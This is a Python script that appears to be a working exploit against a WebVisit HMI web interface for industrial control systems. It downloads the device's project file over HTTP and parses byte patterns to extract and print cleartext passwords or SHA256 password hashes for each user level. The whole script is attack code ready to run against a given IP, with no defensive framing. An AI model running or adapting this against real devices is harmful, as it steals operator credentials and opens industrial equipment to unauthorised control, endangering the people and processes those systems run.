#! /usr/bin/env python3

import urllib.request, sys

def reverseByte(xInputData): ## Will return input b'12345678' as b'78563412' and '12345678' as '78563412'
    if isinstance(xInputData, bytes): return b''.join([xInputData[x:x+2] for x in range(0,len(xInputData),2)][::-1])
    else: return ''.join([xInputData[x:x+2] for x in range(0,len(xInputData),2)][::-1])

if len(sys.argv) > 1: 
    sIP = sys.argv[1]
    if 'h' in sIP: exit('Usage: {} <HMI-IP>'.format(sys.argv[0]))
else: sIP = input('Please enter an IP [192.168.0.1]: ')
if sIP == '': sIP = '192.168.0.1'

try:
    oResponse = urllib.request.urlopen('http://{}'.format(sIP), timeout = 5)
except:
    input('[-] ## Critical Error with IP {}: no response\nPress Enter to exit'.format(sIP))
    exit()

sMainTEQ = ''
for bLine in oResponse.readlines():
    if b'MainTEQName' in bLine:
        sMainTEQ = bLine.split(b'VALUE="')[1].split(b'"')[0].decode(errors='ignore')

if sMainTEQ == '':
    input('[-] ## Erro, no "MainTEQ" found on the main page\nPress Enter to exit')
    exit()

try:
    oLoginTeqResponse = urllib.request.urlopen('http://{}/{}'.format(sIP, sMainTEQ), timeout = 5)
except:
    input('[-] ## Critical Error with IP {}: File "" not found\nPress Enter to exit'.format(sIP, sMainTEQ))
    exit()

bAlldata = b''
for bLine in oLoginTeqResponse.readlines(): bAlldata += bLine

## For vulnerable webvisit:
## Seems to be 'userLevel' + x bytes + 1 + y bytes + 'password'
## userLevel + '0506030001' + 31 + '00030003010301068300' + passlength + 'password'
## For WebVisit > 6.40.00
## userLevel + '0003000301030b06830040' + 'SHA256' (wich is 64 bytes)
for bLine in bAlldata.split(b'userLevel\x05\x06\x03\x00\x01'):
    if b'\x00\x03\x00\x03\x01\x03\x01\x06\x83\x00' in bLine:  ## Cleartext password
        sUserlevel = bLine[:1].decode()
        iPassLength = int(bLine.split(b'\x00\x03\x00\x03\x01\x03\x01\x06\x83\x00')[1][:1].hex(), 16)
        sPassword = bLine.split(b'\x00\x03\x00\x03\x01\x03\x01\x06\x83\x00')[1][1:1+iPassLength].decode(errors='ignore')
        print('Password for user level {}: {}'.format(sUserlevel, sPassword))
    elif b'\x00\x03\x00\x03\x01\x03\x0b\x06\x83\x00@' in bLine:  ## Hash format
        sUserlevel = bLine[:1].decode()
        sHash = bLine.split(b'\x00\x03\x00\x03\x01\x03\x0b\x06\x83\x00@')[1][:64].decode()
        print('Hash for userlevel {}: {}'.format(sUserlevel, sHash))

if len(sys.argv) == 1: input('Press Enter to exit')
